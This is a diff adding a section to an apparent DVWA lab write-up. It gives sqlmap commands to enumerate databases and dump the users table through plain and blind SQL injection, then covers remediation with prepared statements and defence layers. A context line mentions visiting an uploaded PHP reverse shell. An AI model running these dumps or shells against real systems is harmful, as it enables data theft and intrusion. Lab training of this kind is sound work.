@@ -252,5 +252,72 @@ visit http://localhost/hackable/uploads/php-reverse-shell.php
 ---
 
 
+# SQL Injection Exploitation with SQLMap
+
+## Simple SQL Injection
+<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/27212330-a322-476a-b6fc-3bb803990506" />
+<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/3afdabf7-833b-4b68-b756-92a34c51cd3b" />
+**Automated Commands:**
+```bash
+# Save request to file first, then:
+sqlmap -r request.txt -p id --batch --dbs
+sqlmap -r request.txt -p id --batch -D dvwa --tables
+sqlmap -r request.txt -p id --batch -D dvwa -T users --dump
+```
+
+## Blind SQL Injection
+<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/977b68c3-b4b8-46f4-a378-7f2501830706" />
+<img width="950" height="937" alt="image" src="https://github.com/user-attachments/assets/ffeb547e-99ba-4a2a-947e-b79b8ea1cc99" />
+
+**Automated Commands:**
+```bash
+# Save request to file first, then:
+sqlmap -r request.txt -p id --batch --technique=B --dbs
+sqlmap -r request.txt -p id --batch --technique=B -D dvwa -T users --dump
+```
+
+## Quick Exploitation
+```bash
+# Simple SQLi
+sqlmap -r request.txt -p id --batch --current-db
+
+# Blind SQLi  
+sqlmap -r request.txt -p id --batch --technique=B --current-db
+```
+
+**Note:** Save HTTP requests to `request.txt` before running SQLMap commands.
+# SQL Injection Remediation
+
+## Comprehensive Security Measures
+
+### 1. Input Validation & Parameterized Queries
+```php
+// Vulnerable
+$query = "SELECT * FROM users WHERE id = $id";
+
+// Secure - Prepared Statements
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$id]);
+```
+
+### 2. Defense Layers
+- **Use Prepared Statements** (PDO/MySQLi)
+- **Implement Input Whitelisting**
+- **Apply Least Privilege Principle** to DB users
+- **Enable Web Application Firewall (WAF)**
+- **Regular Security Patching**
+
+### 3. Secure Coding Practices
+- **Never concatenate** user input in queries
+- **Use ORM/Query Builders** when possible
+- **Validate & Sanitize** all inputs
+- **Implement Proper Error Handling** (no detailed errors to users)
+
+### 4. Continuous Security
+- **Code Review** for SQLi vulnerabilities
+- **Penetration Testing** & Security Audits
+- **Automated Security Scanning** in CI/CD
+
+**Remember:** Parameterized queries are the most effective defense against SQL injection attacks.
 
 
